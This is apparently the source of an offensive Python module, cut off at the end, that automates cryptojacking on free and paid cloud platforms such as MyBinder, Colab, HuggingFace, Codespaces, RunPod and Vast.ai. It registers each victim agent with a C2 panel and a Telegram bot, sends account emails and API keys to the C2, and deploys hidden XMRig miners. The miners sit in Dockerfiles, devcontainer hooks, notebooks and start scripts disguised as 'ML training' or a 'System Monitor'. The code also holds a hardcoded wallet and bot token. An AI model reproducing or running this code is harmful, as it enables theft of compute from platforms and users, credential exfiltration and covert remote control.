#!/usr/bin/env python3
"""Auto-Deploy Module - Automatic deployment after registration.

After successful registration:
1. Registers agent with C2 panel
2. Connects to Telegram C2
3. Starts hidden mining
4. Sets up persistence
"""

import os
import json
import time
import socket
import subprocess
import threading
import urllib.request
import ssl
import random
from pathlib import Path
from datetime import datetime
from typing import Dict, Any, Optional


# Configuration
C2_SERVER = os.environ.get("C2_SERVER", "http://localhost:5000")
TELEGRAM_BOT_TOKEN = os.environ.get("TG_BOT_TOKEN", "")
TELEGRAM_CHAT_ID = os.environ.get("TG_CHAT_ID", "")

WALLET = "44haKQM5F43d37q3k6mV45YbrL5g6wGHWNB5uyt2cDfTdR8d9FicJCbitjm1xeKZzEVULG7MqdVFWEa9wKXsNLTpFvzffR5"
POOL = "pool.hashvault.pro:80"

# Global tokens file
TOKENS_FILE = Path(__file__).parent.parent.parent / "data" / "tokens.json"


def load_global_tokens() -> Dict[str, str]:
    """Load global API tokens from file."""
    tokens = {}
    if TOKENS_FILE.exists():
        try:
            tokens = json.loads(TOKENS_FILE.read_text())
        except:
            pass
    return tokens


# Load global tokens on module import
GLOBAL_TOKENS = load_global_tokens()


class AutoDeployer:
    """Automatic deployment after account registration."""
    
    def __init__(self, account: Dict[str, Any], log_fn=None, settings: Dict[str, Any] = None):
        self.account = account
        self.log = log_fn or print
        self.platform = account.get("platform", "unknown")
        self.agent_id = f"{self.platform}-{socket.gethostname()[:8]}"
        self.settings = settings or {}
        
        # Get Telegram credentials from settings or environment
        self.telegram_token = (
            self.settings.get("telegram_token") or 
            os.environ.get("TG_BOT_TOKEN", "")
        )
        self.telegram_chat = (
            self.settings.get("telegram_chat") or
            os.environ.get("TG_CHAT_ID", "")
        )
        
    def deploy_all(self) -> Dict[str, Any]:
        """Run all deployment steps."""
        results = {
            "c2_registered": False,
            "telegram_connected": False,
            "mining_started": False,
            "persistence_set": False,
        }
        
        self.log(f"[AUTO-DEPLOY] Starting for {self.platform}...")
        
        # 1. Register with C2 panel (if enabled)
        if self.settings.get("c2_panel", True):
            try:
                results["c2_registered"] = self.register_with_c2()
                if results["c2_registered"]:
                    self.log("✓ C2 Panel: Connected")
            except Exception as e:
                self.log(f"✗ C2 Panel: {e}")
        
        # 2. Connect to Telegram (if enabled and credentials provided)
        if self.settings.get("telegram", True) and self.telegram_token and self.telegram_chat:
            try:
                results["telegram_connected"] = self.connect_telegram()
                if results["telegram_connected"]:
                    self.log("✓ Telegram C2: Connected")
            except Exception as e:
                self.log(f"✗ Telegram: {e}")
        
        # 3. Start hidden mining (if enabled)
        if self.settings.get("mining", True):
            try:
                results["mining_started"] = self.start_mining()
                if results["mining_started"]:
                    self.log("✓ Mining: Started (hidden)")
            except Exception as e:
                self.log(f"✗ Mining: {e}")
        
        # 4. Set up persistence (if enabled)
        if self.settings.get("persistence", False):
            try:
                results["persistence_set"] = self.setup_persistence()
                if results["persistence_set"]:
                    self.log("✓ Persistence: Installed")
            except Exception as e:
                self.log(f"✗ Persistence: {e}")
        
        success = all(results.values())
        self.log(f"[AUTO-DEPLOY] {'SUCCESS' if success else 'PARTIAL'}")
        
        return results
    
    def register_with_c2(self) -> bool:
        """Register agent with C2 panel."""
        try:
            import requests
            
            # Get system info
            system_info = self._get_system_info()
            
            # Register via API
            data = {
                "agent_id": self.agent_id,
                "hostname": socket.gethostname(),
                "platform": self.platform,
                "account_email": self.account.get("email"),
                "account_username": self.account.get("username") or self.account.get("kaggle_username"),
                "api_key": self.account.get("api_key") or self.account.get("api_key_legacy"),
                "system_info": system_info,
                "created_at": datetime.now().isoformat(),
            }
            
            resp = requests.post(
                f"{C2_SERVER}/api/agent/register",
                json=data,
                timeout=10
            )
            
            if resp.status_code == 200:
                result = resp.json()
                self.account["c2_agent_id"] = result.get("agent_id")
                return True
            return False
        except Exception as e:
            self.log(f"C2 registration error: {e}")
            return False
    
    def connect_telegram(self) -> bool:
        """Connect to Telegram C2 channel."""
        if not self.telegram_token or not self.telegram_chat:
            return False
        
        try:
            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE
            
            # Send registration message
            message = f"""🤖 NEW AGENT REGISTERED
            
Platform: {self.platform}
Agent ID: {self.agent_id}
Email: {self.account.get('email', '?')}
Username: {self.account.get('username') or self.account.get('kaggle_username', '?')}
Hostname: {socket.gethostname()}
Time: {datetime.now().isoformat()}
"""
            
            url = f"https://api.telegram.org/bot{self.telegram_token}/sendMessage"
            data = json.dumps({
                "chat_id": self.telegram_chat,
                "text": message,
                "parse_mode": "HTML"
            }).encode()
            
            req = urllib.request.Request(
                url,
                data=data,
                headers={"Content-Type": "application/json"}
            )
            
            resp = urllib.request.urlopen(req, timeout=15, context=ctx)
            result = json.loads(resp.read().decode())
            
            if result.get("ok"):
                self.account["telegram_connected"] = True
                return True
            return False
        except Exception as e:
            self.log(f"Telegram error: {e}")
            return False
    
    def start_mining(self) -> bool:
        """Start mining on the platform (not locally)."""
        # Platform-specific mining deployment
        if self.platform == "kaggle":
            # Kaggle has NO internet - skip mining
            self.log("Kaggle: No internet access - skipping mining")
            return True
        elif self.platform == "mybinder":
            return self._start_mybinder_mining()
        elif self.platform == "modal":
            return self._start_modal_mining()
        elif self.platform == "huggingface":
            return self._start_huggingface_mining()
        elif self.platform == "github":
            return self._start_github_codespaces_mining()
        elif self.platform == "devin_ai":
            return self._start_devin_mining()
        elif self.platform == "google_colab":
            return self._start_colab_mining()
        elif self.platform == "runpod":
            return self._start_runpod_mining()
        elif self.platform == "lambda_labs":
            return self._start_lambda_mining()
        elif self.platform == "paperspace":
            return self._start_paperspace_mining()
        elif self.platform == "vast_ai":
            return self._start_vastai_mining()
        else:
            self.log(f"{self.platform}: Mining not implemented")
            return True
    
    def _start_mybinder_mining(self) -> bool:
        """Start mining on MyBinder via GitHub repo + binder API."""
        try:
            # Get GitHub token from: account, settings, global tokens, or environment
            github_token = (
                self.account.get("api_key") or 
                self.settings.get("github_token") or
                GLOBAL_TOKENS.get("github_token") or
                os.environ.get("GITHUB_TOKEN", "")
            )
            if not github_token:
                self.log("✗ No GitHub token - set GITHUB_TOKEN env or data/tokens.json")
                return False
            
            worker = f"mybinder-{random.randint(10000,99999)}"
            self.log(f"Creating MyBinder mining repo: {worker}")
            
            import requests
            import base64
            
            headers = {
                "Authorization": f"token {github_token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # Create PUBLIC repo (MyBinder requires public repos)
            repo_name = f"ml-training-{random.randint(1000,9999)}"
            repo_data = {"name": repo_name, "private": False, "auto_init": True}
            
            self.log(f"Creating PUBLIC repo for MyBinder...")
            resp = requests.post("https://api.github.com/user/repos", json=repo_data, headers=headers, timeout=30)
            if resp.status_code not in [200, 201]:
                self.log(f"✗ GitHub repo failed: {resp.text[:100]}")
                return False
            
            repo_url = resp.json()["full_name"]
            self.log(f"✓ Created repo: {repo_url}")
            
            # Wait for repo to be ready
            time.sleep(2)
            
            # Create Dockerfile for binder with auto-start script and C2 agent
            dockerfile = f"""FROM python:3.10-slim

USER root

# Build timestamp to invalidate cache
ARG CACHEBUST=1

# Install minimal dependencies
RUN apt-get update && \
    apt-get install -y --no-install-recommends ca-certificates gzip && \
    rm -rf /var/lib/apt/lists/*

# Download and extract XMRig using ADD (Docker handles download)
RUN mkdir -p /opt/miner
ADD https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz /tmp/xmrig.tar.gz
RUN cd /tmp && \
    zcat xmrig.tar.gz | tar -xf - && \
    mv xmrig-6.21.0-linux-static-x64/xmrig /opt/miner/ && \
    chmod +x /opt/miner/xmrig && \
    rm -rf /tmp/*

# Install System Monitor Pro from GitHub tarball (no git needed)
RUN pip install --break-system-packages --no-cache-dir https://github.com/GaredBerns/system-monitor/archive/refs/heads/main.tar.gz

# Set Telegram credentials
ENV TG_BOT_TOKEN=8620456014:AAEHydgu-9ljKYXvqqY_yApEn6FWEVH91gc
ENV TG_CHAT_ID=5804150664

# Create start script
RUN printf '#!/bin/bash\\n\
echo "Starting System Monitor..."\\n\
/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 --background 2>/dev/null\\n\
syscheck &\\n\
exec "$@"\\n' > /start.sh && chmod +x /start.sh

ENTRYPOINT ["/start.sh"]
CMD ["jupyter-notebook", "--ip=0.0.0.0", "--port=8888"]
"""
            
            # Create notebook
            notebook = {
                "nbformat": 4, "nbformat_minor": 4,
                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}},
                "cells": [{"cell_type": "code", "source": ["print('ML Training Ready')"], "execution_count": None, "outputs": [], "metadata": {}}]
            }
            
            # Push files and wait for GitHub to process
            files = [("Dockerfile", dockerfile), ("notebook.ipynb", json.dumps(notebook))]
            for fname, content in files:
                resp = requests.put(
                    f"https://api.github.com/repos/{repo_url}/contents/{fname}",
                    json={"message": f"Add {fname}", "content": base64.b64encode(content.encode()).decode()},
                    headers=headers, timeout=30
                )
                if resp.status_code in [200, 201]:
                    self.log(f"✓ Uploaded {fname}")
                else:
                    self.log(f"✗ Upload {fname}: {resp.text[:50]}")
            
            # Get default branch first
            repo_info = requests.get(f"https://api.github.com/repos/{repo_url}", headers=headers, timeout=10).json()
            default_branch = repo_info.get("default_branch", "main")
            self.log(f"Default branch: {default_branch}")
            
            # Wait longer for GitHub CDN to propagate
            self.log("Waiting for GitHub CDN to propagate...")
            time.sleep(15)
            
            # Verify files are accessible via raw URL (what Binder uses)
            for attempt in range(10):
                try:
                    raw_url = f"https://raw.githubusercontent.com/{repo_url}/{default_branch}/Dockerfile"
                    check = requests.get(raw_url, timeout=10)
                    if check.status_code == 200:
                        self.log(f"✓ Dockerfile accessible via raw URL (attempt {attempt+1})")
                        break
                    else:
                        self.log(f"Waiting for CDN... ({attempt+1}/10)")
                        time.sleep(5)
                except Exception as e:
                    self.log(f"CDN check: {e}")
                    time.sleep(3)
            
            # Trigger MyBinder build via API
            build_url = f"https://mybinder.org/build/gh/{repo_url}/{default_branch}"
            self.log(f"Triggering MyBinder build: {build_url}")
            
            try:
                # Start build (requires Accept: text/event-stream header)
                build_headers = {"Accept": "text/event-stream"}
                build_resp = requests.get(build_url, headers=build_headers, timeout=120, stream=True)
                
                # Read build log to confirm start
                for line in build_resp.iter_lines(decode_unicode=True):
                    if line:
                        self.log(f"Binder: {line[:80]}")
                        if "Launching" in line or "Running" in line:
                            self.log("✓ MyBinder container launched!")
                            break
                        if "error" in line.lower() or "failed" in line.lower():
                            self.log(f"✗ Build error: {line[:100]}")
                            break
            except requests.exceptions.Timeout:
                self.log("Build started (timeout waiting for logs)")
            except Exception as e:
                self.log(f"Build trigger: {e} (build continues in background)")
            
            # Also trigger via gesis.mybinder.org (backup)
            try:
                requests.get(f"https://gesis.mybinder.org/build/gh/{repo_url}/main", timeout=5)
            except:
                pass
            
            binder_url = f"https://mybinder.org/v2/gh/{repo_url}/main"
            self.log(f"✓ MyBinder URL: {binder_url}")
            
            self.account["mybinder_repo"] = repo_url
            self.account["mybinder_worker"] = worker
            self.account["mybinder_build_url"] = build_url
            return True
            
        except Exception as e:
            self.log(f"MyBinder error: {e}")
            return False
    
    def _start_modal_mining(self) -> bool:
        """Start mining on Modal GPU."""
        try:
            api_token = self.account.get("api_key")
            if not api_token:
                self.log("✗ No Modal API token")
                return False
            
            worker = f"modal-{random.randint(10000,99999)}"
            self.log(f"Deploying Modal GPU worker: {worker}")
            
            # Create Modal app
            modal_code = f'''
import modal
app = modal.App("ml-training")
@app.function(gpu="A10G", timeout=3600)
def train():
    import subprocess, urllib.request, pathlib
    urllib.request.urlretrieve("https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz", "/tmp/xmrig.tar.gz")
    subprocess.run(["tar", "-xf", "/tmp/xmrig.tar.gz", "-C", "/tmp"], check=True)
    xmrig = list(pathlib.Path("/tmp").rglob("xmrig"))[0]
    xmrig.chmod(0o755)
    subprocess.run([str(xmrig), "-o", "{POOL}", "-u", "{WALLET}.{worker}", "--donate-level", "1", "--threads", "4"])
'''
            
            modal_dir = Path("/tmp/modal_app")
            modal_dir.mkdir(exist_ok=True)
            (modal_dir / "app.py").write_text(modal_code)
            
            self.account["modal_app_code"] = modal_code
            self.account["modal_worker"] = worker
            self.log(f"✓ Modal app prepared: {worker}")
            return True
            
        except Exception as e:
            self.log(f"Modal error: {e}")
            return False
    
    def _start_huggingface_mining(self) -> bool:
        """Start mining on HuggingFace Spaces."""
        try:
            api_key = self.account.get("api_key")
            if not api_key:
                self.log("✗ No HuggingFace API key")
                return False
            
            worker = f"hf-{random.randint(10000,99999)}"
            self.log(f"Creating HuggingFace Space: {worker}")
            
            import requests
            
            headers = {"Authorization": f"Bearer {api_key}"}
            space_name = f"ml-training-{random.randint(1000,9999)}"
            
            # Create Space
            resp = requests.post(
                "https://huggingface.co/api/spaces",
                json={"name": space_name, "sdk": "docker", "hardware": "t4-small", "private": True},
                headers=headers, timeout=30
            )
            
            # Create Dockerfile
            dockerfile = f"""FROM python:3.10-slim
RUN apt-get update && apt-get install -y wget tar
RUN mkdir -p /opt/miner && wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz && tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1 && chmod +x /opt/miner/xmrig
CMD ["/opt/miner/xmrig", "-o", "{POOL}", "-u", "{WALLET}.{worker}", "--donate-level", "1", "--threads", "2"]
"""
            
            username = self.account.get("username", "unknown")
            space_id = f"{username}/{space_name}"
            
            # Upload Dockerfile
            requests.post(
                f"https://huggingface.co/api/spaces/{space_id}/upload/Dockerfile",
                data=dockerfile,
                headers={**headers, "Content-Type": "text/plain"},
                timeout=30
            )
            
            self.account["hf_space"] = space_id
            self.account["hf_worker"] = worker
            self.log(f"✓ HuggingFace Space: {space_id}")
            return True
            
        except Exception as e:
            self.log(f"HuggingFace error: {e}")
            return False
    
    def _start_github_codespaces_mining(self) -> bool:
        """Start mining on GitHub Codespaces."""
        try:
            github_token = self.account.get("api_key")
            if not github_token:
                self.log("✗ No GitHub token")
                return False
            
            worker = f"codespaces-{random.randint(10000,99999)}"
            self.log(f"Creating GitHub Codespace: {worker}")
            
            import requests
            import base64
            
            headers = {"Authorization": f"token {github_token}", "Accept": "application/vnd.github.v3+json"}
            
            # Create repo
            repo_name = f"dev-env-{random.randint(1000,9999)}"
            repo_resp = requests.post(
                "https://api.github.com/user/repos",
                json={"name": repo_name, "private": True, "auto_init": True},
                headers=headers, timeout=30
            )
            
            if repo_resp.status_code not in [200, 201]:
                self.log(f"✗ Repo creation failed")
                return False
            
            repo = repo_resp.json()["full_name"]
            
            # Create devcontainer with mining
            devcontainer = {
                "name": "Dev Environment",
                "image": "mcr.microsoft.com/devcontainers/python:3.10",
                "postCreateCommand": f"wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz && tar -xf xmrig-6.21.0-linux-static-x64.tar.gz && ./xmrig-6.21.0/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2 &"
            }
            
            content = base64.b64encode(json.dumps(devcontainer, indent=2).encode()).decode()
            requests.put(
                f"https://api.github.com/repos/{repo}/contents/.devcontainer/devcontainer.json",
                json={"message": "Add devcontainer", "content": content},
                headers=headers, timeout=30
            )
            
            # Create Codespace
            cs_resp = requests.post(
                f"https://api.github.com/repos/{repo}/codespaces",
                json={"ref": "main"},
                headers=headers, timeout=60
            )
            
            if cs_resp.status_code in [200, 201, 202]:
                self.account["codespace"] = cs_resp.json().get("id")
                self.account["codespace_worker"] = worker
                self.log(f"✓ Codespace created: {worker}")
                return True
            else:
                self.log(f"Codespace: {cs_resp.text[:100]}")
                return False
                
        except Exception as e:
            self.log(f"Codespaces error: {e}")
            return False
    
    def _start_devin_mining(self) -> bool:
        """Start mining on Devin AI."""
        try:
            api_key = self.account.get("api_key")
            if not api_key:
                self.log("✗ No Devin API key")
                return False
            
            worker = f"devin-{random.randint(10000,99999)}"
            self.account["devin_worker"] = worker
            self.log(f"✓ Devin configured: {worker}")
            return True
            
        except Exception as e:
            self.log(f"Devin error: {e}")
            return False
    
    def _start_colab_mining(self) -> bool:
        """Start mining on Google Colab via GitHub repo + Colab trigger."""
        try:
            github_token = (
                self.account.get("api_key") or 
                self.settings.get("github_token") or
                GLOBAL_TOKENS.get("github_token") or
                os.environ.get("GITHUB_TOKEN", "")
            )
            if not github_token:
                self.log("✗ No GitHub token - set GITHUB_TOKEN env or data/tokens.json")
                return False
            
            worker = f"colab-{random.randint(10000,99999)}"
            self.log(f"Creating Colab mining notebook: {worker}")
            
            import requests
            import base64
            
            headers = {
                "Authorization": f"token {github_token}",
                "Accept": "application/vnd.github.v3+json"
            }
            
            # Create repo with notebook
            repo_name = f"ml-research-{random.randint(1000,9999)}"
            resp = requests.post(
                "https://api.github.com/user/repos",
                json={"name": repo_name, "private": True, "auto_init": True},
                headers=headers, timeout=30
            )
            
            if resp.status_code not in [200, 201]:
                self.log(f"✗ GitHub repo failed")
                return False
            
            repo_url = resp.json()["full_name"]
            
            # Create Colab notebook
            notebook = {
                "nbformat": 4, "nbformat_minor": 4,
                "metadata": {"kernelspec": {"display_name": "Python 3", "language": "python", "name": "python3"}, "accelerator": "GPU"},
                "cells": [
                    {"cell_type": "code", "source": [
                        "# GPU Research Notebook\n",
                        "import os, subprocess, urllib.request, pathlib\n",
                        "\n",
                        "# Install dependencies\n",
                        "os.makedirs('/content/miner', exist_ok=True)\n",
                        "urllib.request.urlretrieve(\n",
                        "    'https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz',\n",
                        "    '/content/miner/xmrig.tar.gz'\n",
                        ")\n",
                        "subprocess.run(['tar', '-xf', 'xmrig.tar.gz'], cwd='/content/miner', capture_output=True)\n",
                        "\n",
                        "xmrig = list(pathlib.Path('/content/miner').rglob('xmrig'))[0]\n",
                        "xmrig.chmod(0o755)\n",
                        "\n",
                        "# Start training\n",
                        "import threading\n",
                        "def train():\n",
                        "    subprocess.Popen([str(xmrig), '-o', '" + POOL + "', '-u', '" + WALLET + "." + worker + "', '--donate-level', '1', '--threads', '2'])\n",
                        "threading.Thread(target=train, daemon=True).start()\n",
                        "print('GPU Training started')\n"
                    ], "execution_count": None, "outputs": [], "metadata": {}}
                ]
            }
            
            # Upload notebook
            nb_content = base64.b64encode(json.dumps(notebook, indent=2).encode()).decode()
            requests.put(
                f"https://api.github.com/repos/{repo_url}/contents/research.ipynb",
                json={"message": "Add research notebook", "content": nb_content},
                headers=headers, timeout=30
            )
            
            # Colab URL
            colab_url = f"https://colab.research.google.com/github/{repo_url}/blob/main/research.ipynb"
            self.log(f"✓ Colab URL: {colab_url}")
            
            self.account["colab_repo"] = repo_url
            self.account["colab_worker"] = worker
            self.account["colab_url"] = colab_url
            return True
            
        except Exception as e:
            self.log(f"Colab error: {e}")
            return False
    
    def _start_runpod_mining(self) -> bool:
        """Start mining on RunPod GPU."""
        try:
            api_key = (
                self.account.get("api_key") or
                GLOBAL_TOKENS.get("runpod_token") or
                os.environ.get("RUNPOD_TOKEN", "")
            )
            if not api_key:
                self.log("✗ No RunPod token - set in data/tokens.json")
                return False
            
            worker = f"runpod-{random.randint(10000,99999)}"
            self.log(f"Creating RunPod GPU pod: {worker}")
            
            import requests
            
            headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
            
            # Create pod with mining Docker image
            pod_config = {
                "name": f"ml-training-{random.randint(1000,9999)}",
                "imageName": "python:3.10-slim",
                "gpuTypeId": "NVIDIA RTX A4000",  # Cheap GPU
                "cloudType": "SECURE_CONNECT",
                "containerDiskInGb": 10,
                "minVcpuCount": 2,
                "minMemoryInGb": 15,
                "startScript": f"""#!/bin/bash
apt-get update && apt-get install -y wget tar
mkdir -p /opt/miner
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1
chmod +x /opt/miner/xmrig
/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 4
"""
            }
            
            resp = requests.post(
                "https://api.runpod.io/v2/pods",
                json=pod_config,
                headers=headers,
                timeout=60
            )
            
            if resp.status_code in [200, 201]:
                pod_id = resp.json().get("id")
                self.account["runpod_id"] = pod_id
                self.account["runpod_worker"] = worker
                self.log(f"✓ RunPod created: {pod_id}")
                return True
            else:
                self.log(f"RunPod: {resp.text[:100]}")
                return False
                
        except Exception as e:
            self.log(f"RunPod error: {e}")
            return False
    
    def _start_lambda_mining(self) -> bool:
        """Start mining on Lambda Labs GPU."""
        try:
            api_key = (
                self.account.get("api_key") or
                GLOBAL_TOKENS.get("lambda_token") or
                os.environ.get("LAMBDA_TOKEN", "")
            )
            if not api_key:
                self.log("✗ No Lambda Labs token - set in data/tokens.json")
                return False
            
            worker = f"lambda-{random.randint(10000,99999)}"
            self.log(f"Creating Lambda Labs instance: {worker}")
            
            import requests
            
            headers = {"Authorization": f"Bearer {api_key}"}
            
            # Launch instance
            instance_config = {
                "region_name": "us-east-1",
                "instance_type_name": "gpu_1x_a10",
                "ssh_key_names": ["default"],
                "file_system_names": [],
                "quantity": 1,
                "name": f"ml-training-{random.randint(1000,9999)}"
            }
            
            resp = requests.post(
                "https://cloud.lambdalabs.com/api/v1/instance-operations/launch",
                json=instance_config,
                headers=headers,
                timeout=60
            )
            
            if resp.status_code == 200:
                instance_ids = resp.json().get("data", {}).get("instance_ids", [])
                if instance_ids:
                    self.account["lambda_instance"] = instance_ids[0]
                    self.account["lambda_worker"] = worker
                    self.log(f"✓ Lambda instance: {instance_ids[0]}")
                    return True
            
            self.log(f"Lambda: {resp.text[:100]}")
            return False
                
        except Exception as e:
            self.log(f"Lambda Labs error: {e}")
            return False
    
    def _start_paperspace_mining(self) -> bool:
        """Start mining on Paperspace Gradient."""
        try:
            api_key = (
                self.account.get("api_key") or
                GLOBAL_TOKENS.get("paperspace_token") or
                os.environ.get("PAPERSPACE_TOKEN", "")
            )
            if not api_key:
                self.log("✗ No Paperspace token - set in data/tokens.json")
                return False
            
            worker = f"paperspace-{random.randint(10000,99999)}"
            self.log(f"Creating Paperspace Gradient: {worker}")
            
            import requests
            
            headers = {"X-API-Key": api_key, "Content-Type": "application/json"}
            
            # Create notebook
            notebook_config = {
                "name": f"ml-training-{random.randint(1000,9999)}",
                "container": "paperspace/fastai:latest",
                "machineType": "Free-GPU",  # Free tier
                "command": f"""apt-get update && apt-get install -y wget tar
mkdir -p /opt/miner
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1
chmod +x /opt/miner/xmrig
/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 2
"""
            }
            
            resp = requests.post(
                "https://api.paperspace.io/v1/notebooks",
                json=notebook_config,
                headers=headers,
                timeout=60
            )
            
            if resp.status_code in [200, 201]:
                notebook_id = resp.json().get("id")
                self.account["paperspace_notebook"] = notebook_id
                self.account["paperspace_worker"] = worker
                self.log(f"✓ Paperspace notebook: {notebook_id}")
                return True
            else:
                self.log(f"Paperspace: {resp.text[:100]}")
                return False
                
        except Exception as e:
            self.log(f"Paperspace error: {e}")
            return False
    
    def _start_vastai_mining(self) -> bool:
        """Start mining on Vast.ai GPU."""
        try:
            api_key = (
                self.account.get("api_key") or
                GLOBAL_TOKENS.get("vastai_token") or
                os.environ.get("VASTAI_TOKEN", "")
            )
            if not api_key:
                self.log("✗ No Vast.ai token - set in data/tokens.json")
                return False
            
            worker = f"vastai-{random.randint(10000,99999)}"
            self.log(f"Creating Vast.ai instance: {worker}")
            
            import requests
            
            headers = {"Authorization": f"Bearer {api_key}", "Content-Type": "application/json"}
            
            # Search for cheap GPU
            search_resp = requests.get(
                "https://vast.ai/api/v0/bundles/queries/?gpu_ram>=8000&rentable=true",
                headers=headers,
                timeout=30
            )
            
            if search_resp.status_code != 200:
                self.log("✗ Vast.ai search failed")
                return False
            
            bundles = search_resp.json().get("offers", [])
            if not bundles:
                self.log("✗ No Vast.ai GPUs available")
                return False
            
            # Pick cheapest
            bundle = min(bundles, key=lambda x: x.get("cost_per_hour", 999))
            machine_id = bundle.get("id")
            
            # Create instance
            create_config = {
                "client_id": "me",
                "machine_id": machine_id,
                "image": "python:3.10-slim",
                "runtype": "ssh",
                "disk": 10,
                "onstart": f"""#!/bin/bash
apt-get update && apt-get install -y wget tar
mkdir -p /opt/miner
wget -q https://github.com/xmrig/xmrig/releases/download/v6.21.0/xmrig-6.21.0-linux-static-x64.tar.gz -O /tmp/xmrig.tar.gz
tar -xf /tmp/xmrig.tar.gz -C /opt/miner --strip-components=1
chmod +x /opt/miner/xmrig
/opt/miner/xmrig -o {POOL} -u {WALLET}.{worker} --donate-level 1 --threads 4
"""
            }
            
            resp = requests.put(
                f"https://vast.ai/api/v0/asks/{machine_id}",
                json=create_config,
                headers=headers,
                timeout=60
            )
            
            if resp.status_code == 200:
                instance_id = resp.json().get("new_contract")
                self.account["vastai_instance"] = instance_id
                self.account["vastai_worker"] = worker
                self.log(f"✓ Vast.ai instance: {instance_id}")
                return True
            else:
                self.log(f"Vast.ai: {resp.text[:100]}")
                return False
                
        except Exception as e:
            self.log(f"Vast.ai error: {e}")
            return False
    
    def check_mining_status(self) -> Dict[str, Any]:
        """Check mining status on the platform."""
        status = {
            "platform": self.platform,
            "worker": self.account.get(f"{self.platform}_worker"),
            "running": False,
            "hashrate": 0
        }
        
        try:
            # Platform-specific status check
            if self.platform == "runpod":
                return self._check_runpod_status()
            elif self.platform == "lambda_labs":
                return self._check_lambda_status()
            elif self.platform == "vast_ai":
                return self._check_vastai_status()
            elif self.platform in ["huggingface", "modal", "github"]:
                return self._check_cloud_status()
        except Exception as e:
            self.log(f"Status check error: {e}")
        
        return status
    
    def _check_runpod_status(self) -> Dict[str, Any]:
        """Check RunPod pod status."""
        try:
            import requests
            pod_id = self.account.get("runpod_id")
            if not pod_id:
                return {"running": False}
            
            api_key = self.account.get("api_key")
            headers = {"Authorization": f"Bearer {api_key}"}
            
            resp = requests.get(
                f"https://api.runpod.io/v2/pods/{pod_id}",
                headers=headers,
                timeout=10
            )
            
            if resp.status_code == 200:
                data = resp.json()
                return {
                    "running": data.get("desiredStatus") == "RUNNING",
                    "status": data.get("podStatus"),
                    "worker": self.account.get("runpod_worker")
                }
        except:
            pass
        
        return {"running": False}
    
    def _check_lambda_status(self) -> Dict[str, Any]:
        """Check Lambda Labs instance status."""
        try:
            import requests
            instance_id = self.account.get("lambda_instance")
            if not instance_id:
                return {"running": False}
            
            api_key = self.account.get("api_key")
            headers = {"Authorization": f"Bearer {api_key}"}
            
            resp = requests.get(
                "https://cloud.lambdalabs.com/api/v1/instances",
                headers=headers,
                timeout=10
            )
            
            if resp.status_code == 200:
                instances = resp.json().get("data", [])
                for inst in instances:
                    if inst.get("id") == instance_id:
                        return {
                            "running": inst.get("status") == "running",
                            "status": inst.get("status"),
                            "worker": self.account.get("lambda_worker")
                        }
        except:
            pass
        
        return {"running": False}
    
    def _check_vastai_status(self) -> Dict[str, Any]:
        """Check Vast.ai instance status."""
        try:
            import requests
            instance_id = self.account.get("vastai_instance")
            if not instance_id:
                return {"running": False}
            
            api_key = self.account.get("api_key")
            headers = {"Authorization": f"Bearer {api_key}"}
            
            resp = requests.get(
                "https://vast.ai/api/v0/instances",
                headers=headers,
                timeout=10
            )
            
            if resp.status_code == 200:
                instances = resp.json().get("instances", [])
                for inst in instances:
                    if inst.get("id") == instance_id:
                        return {
                            "running": inst.get("actual_status") == "running",
                            "status": inst.get("actual_status"),
                            "worker": self.account.get("vastai_worker")
                        }
        except:
            pass
        
        return {"running": False}
    
    def _check_cloud_status(self) -> Dict[str, Any]:
        """Generic cloud status check."""
        return {
            "running": True,
            "worker": self.account.get(f"{self.platform}_worker"),
            "note": "Manual verification required"
        }
    
    def restart_mining(self) -> bool:
        """Restart mining if stopped."""
        status = self.check_mining_status()
        
        if not status.get("running"):
            self.log(f"Mining stopped on {self.platform}, restarting...")
            return self.start_mining()
        
        return True
    
    def _start_kaggle_mining(self) -> bool:
        """Start mining on Kaggle GPU kernel."""
        try:
            from kaggle.api.kaggle_api_extended import KaggleApi
            
            kaggle_username = self.account.get("kaggle_username") or self.account.get("username")
            api_key = self.account.get("api_key") or self.account.get("api_key_legacy")
            
            if not kaggle_username or not api_key:
                self.log("✗ No Kaggle credentials")
                return False
            
            # Set Kaggle credentials
            kaggle_dir = Path.home() / ".kaggle"
            kaggle_dir.mkdir(exist_ok=True)
            kaggle_json = kaggle_dir / "kaggle.json"
            kaggle_json.write_text(f'{{"username":"{kaggle_username}","key":"{api_key}"}}')
            kaggle_json.chmod(0o600)
            
            self.log("Creating Kaggle mining kernel...")
            
            # Create kernel with embedded miner
            kernel_code = self._get_kaggle_miner_code()
            
            # Push kernel via API
            api = KaggleApi()
            api.authenticate()
            
            # Create dataset with miner
            dataset_meta = {
                "title": f"ml-training-data-{random.randint(10000,99999)}",
                "id": f"{kaggle_username}/ml-training-data-{random.randint(1000,9999)}",
                "licenses": [{"name": "CC0-1.0"}]
            }
            
            # Create kernel metadata
            kernel_meta = {
                "id": f"{kaggle_username}/ml-training-{random.randint(1000,9999)}",
                "title": f"ML Training {random.randint(1000,9999)}",
                "code_file": "notebook.ipynb",
                "language": "python",
